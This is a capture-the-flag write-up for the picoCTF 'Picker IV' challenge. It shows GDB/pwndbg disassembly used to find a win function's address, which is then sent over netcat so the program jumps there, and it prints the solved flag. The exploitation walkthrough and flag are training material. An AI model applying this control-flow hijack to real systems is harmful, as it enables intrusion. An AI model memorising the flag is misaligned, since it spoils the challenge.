https://learn.cylabacademy.org/library/403  

PicoCtf/Reverse_eng/Medium/Files/patrikparker/patriciv
soln :

We’re back to binaries with Picker IV. This program is really nice, it will jump to whatever address we give it, and it doesn’t even need to be in little endian! Looking at the source file, we see there’s a win function in this program. What we need to do is find the address of the win function in the binary and then connect with netcat to the remote program and supply that address. There’s many ways to find this address, but we’ll use GDB since we’ve already been acclimating to that in previous challenges. Open the binary with GDB and run this command (gdb) disassemble win, the address of win is the hex number on the first line all the way to the left. You can exclude leading zeros.



┌──(samin㉿kali)-[~/…/Medium/Files/patrikparker/patriciv]
└─$ gdb -q picker-IV     
pwndbg: loaded 194 pwndbg commands. Type pwndbg [filter] for a list.
pwndbg: created 11 GDB functions (can be used with print/break). Type help function to see them.
Reading symbols from picker-IV...
(No debugging symbols found in picker-IV)
------- tip of the day (disable with set show-tips off) -------
Use cyclic <len> to generate a De Bruijn pattern and cyclic -l <value> to look up an offset - perfect for buffer-overflow offset finding
pwndbg> ❌️ Quit
pwndbg> disassemble win
Dump of assembler code for function win:
   0x000000000040129e <+0>:     endbr64
   0x00000000004012a2 <+4>:     push   rbp
   0x00000000004012a3 <+5>:     mov    rbp,rsp
   0x00000000004012a6 <+8>:     sub    rsp,0x10
   0x00000000004012aa <+12>:    lea    rdi,[rip+0xd74]        # 0x402025
   0x00000000004012b1 <+19>:    call   0x4010f0 <puts@plt>
   0x00000000004012b6 <+24>:    lea    rsi,[rip+0xd71]        # 0x40202e
   0x00000000004012bd <+31>:    lea    rdi,[rip+0xd6c]        # 0x402030
   0x00000000004012c4 <+38>:    call   0x401150 <fopen@plt>
   0x00000000004012c9 <+43>:    mov    QWORD PTR [rbp-0x10],rax
   0x00000000004012cd <+47>:    cmp    QWORD PTR [rbp-0x10],0x0
   0x00000000004012d2 <+52>:    jne    0x4012ea <win+76>
   0x00000000004012d4 <+54>:    lea    rdi,[rip+0xd5e]        # 0x402039
   0x00000000004012db <+61>:    call   0x4010f0 <puts@plt>
   0x00000000004012e0 <+66>:    mov    edi,0x0
   0x00000000004012e5 <+71>:    call   0x401170 <exit@plt>
   0x00000000004012ea <+76>:    mov    rax,QWORD PTR [rbp-0x10]
   0x00000000004012ee <+80>:    mov    rdi,rax
   0x00000000004012f1 <+83>:    call   0x401120 <fgetc@plt>
   0x00000000004012f6 <+88>:    mov    BYTE PTR [rbp-0x1],al
   0x00000000004012f9 <+91>:    jmp    0x401315 <win+119>
   0x00000000004012fb <+93>:    movsx  eax,BYTE PTR [rbp-0x1]
   0x00000000004012ff <+97>:    mov    edi,eax
   0x0000000000401301 <+99>:    call   0x4010e0 <putchar@plt>
   0x0000000000401306 <+104>:   mov    rax,QWORD PTR [rbp-0x10]
   0x000000000040130a <+108>:   mov    rdi,rax
   0x000000000040130d <+111>:   call   0x401120 <fgetc@plt>
   0x0000000000401312 <+116>:   mov    BYTE PTR [rbp-0x1],al
   0x0000000000401315 <+119>:   cmp    BYTE PTR [rbp-0x1],0xff
   0x0000000000401319 <+123>:   jne    0x4012fb <win+93>
   0x000000000040131b <+125>:   mov    edi,0xa
   0x0000000000401320 <+130>:   call   0x4010e0 <putchar@plt>
   0x0000000000401325 <+135>:   mov    rax,QWORD PTR [rbp-0x10]
   0x0000000000401329 <+139>:   mov    rdi,rax
   0x000000000040132c <+142>:   call   0x401100 <fclose@plt>
   0x0000000000401331 <+147>:   nop
   0x0000000000401332 <+148>:   leave
   0x0000000000401333 <+149>:   ret
End of assembler dump.
pwndbg> 

┌──(samin㉿kali)-[~]
└─$ nc saturn.picoctf.net 61231
Enter the address in hex to jump to, excluding '0x': 0x000000000040129e
You input 0x40129e
You won!
picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_01672a61}
                                                                                                                                                       